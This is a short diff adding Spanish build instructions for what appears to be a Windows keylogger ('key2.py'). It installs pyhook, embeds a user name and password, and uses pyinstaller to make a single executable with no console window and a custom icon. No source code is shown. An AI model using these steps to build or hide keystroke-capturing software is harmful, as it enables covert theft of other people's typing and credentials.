@@ -1,0 +1,7 @@
+Instalar python 2.7
+Agregar python y python scripts a la variable path
+descargar e instalar pyhook, pywin32, visual c++ compiler for python, pyinstaller
+pip instal -r .\requirements.txt
+modificar codigo con usuario y contraseña
+generar exe con pyinstaller --onefile --noconsole -i icon.ico key2.py
+usar exe que se genero en la carpeta dist
